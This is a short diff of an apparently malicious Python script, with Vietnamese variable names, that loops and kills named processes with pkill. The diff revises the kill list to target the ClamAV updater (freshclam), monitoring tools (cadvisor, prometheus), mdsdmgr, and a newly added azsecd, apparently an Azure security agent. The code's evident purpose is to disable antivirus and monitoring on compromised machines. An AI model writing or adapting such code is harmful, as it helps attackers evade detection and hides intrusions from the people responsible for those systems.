@@ -66,7 +66,7 @@ while True:
         pass
 
     if operate_system == 'lin':
-        array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+        array_kill = ['freshclam', 'mdsdmgr', 'cadvisor', 'prometheus', 'azsecd']
         for n in array_kill:
             try:
                 os.system('pkill ' + n)
@@ -222,7 +222,7 @@ while True:
     for i in range(0, thoi_gian_nghi,2):
         time.sleep(2)
         print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
-        array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+        array_kill = ['freshclam', 'mdsdmgr', 'cadvisor', 'prometheus', 'azsecd']
         for n in array_kill:
             try:
                 os.system('pkill ' + n)
